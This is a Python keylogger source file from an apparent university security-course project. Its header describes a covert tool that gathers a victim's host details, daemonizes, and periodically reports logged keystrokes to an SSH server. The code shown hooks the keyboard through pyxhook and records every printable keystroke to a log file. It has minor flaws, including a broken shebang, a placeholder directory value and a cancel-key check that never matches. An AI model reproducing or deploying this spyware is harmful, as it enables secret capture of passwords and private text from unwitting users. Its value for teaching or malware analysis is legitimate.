#!/usr/bin/env/python3
# keylogger.py
#==============================================================================
 #   Assignment:  Major Project - Final
 #
 #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
 #     Language:  Python 3
 #                      
 #   To Compile: Paramiko must be available 
 #
 #    Class:  DPI912 - Python for Programmers: Sockets and Security
 #    Professor:  Harvey Kaduri
 #    Due Date:  April 17, 2019
 #    Submitted: April 17, 2019
 #
 #-----------------------------------------------------------------------------
 #
 #  Description: This program is a skeleton client that connects to an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
 #      
 #        Input:  Textual Input 
 #
 #       Output:  Friendly messages to the user
 #
 #    Algorithm:  Invokes the Paramiko supplied functions to create and manage a connection to an SSH server. Ask user to voluntarily give up certain information.
 #                      Quietly grab the target user's computer information such as host and IP addresses. 
 #                      Double Fork and begin keylogging data. On a random interval, contact the server and report data logged       

 #   Required Features Not Included: Optional features such as screenshots were not included due to time and COVID constraints.
 #
 #   Known Bugs:  N/A
 #      
 #
 #   Classification: N/A
 #
#==============================================================================
import os
import sys
from argparse import ArgumentParser

import pyxhook

#current working directory, requires paramiko_client.py
cwd = _CWD_
    
def main():
    parser = ArgumentParser(description='A simple keylogger for Linux.')
    parser.add_argument(
            '--log-file',
            default=os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'loggedKeys.log'),
            help='Save the output in this file.',
            )
    parser.add_argument(
            '--clean-file',
            action='store_true',
            default=True,
            help='Clear the log file on startup.Default is No',
            )
    parser.add_argument(
            '--cancel-key',
            help='A single key that use as the cancel key, Default is ` (backtick)',
            )

    args = parser.parse_args()
    # current working directory for work after daemonizing
    logged = cwd +'/loggedKeys.log'
    log_file = logged

    if args.clean_file:
        try:
            os.remove(log_file)
        except OSError:
            # TODO: log with logging module
            pass

    cancel_key = args.cancel_key[0] if args.cancel_key else  '`'

    def OnKeyPress(event):
        with open(log_file, 'a') as f:
            if(event.Ascii > 31 and event.Ascii < 126):
                res=chr(event.Ascii)
                if(event.Ascii == 0): # no corresponding ascii
                    pass #meh
                else:
                    f.write('{}\n'.format(res))
            
        if event.Ascii == cancel_key:
            new_hook.cancel()

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()

    try:
        new_hook.start()
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = 'Error while catching events:\n  {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))

if __name__ == '__main__':
    main()
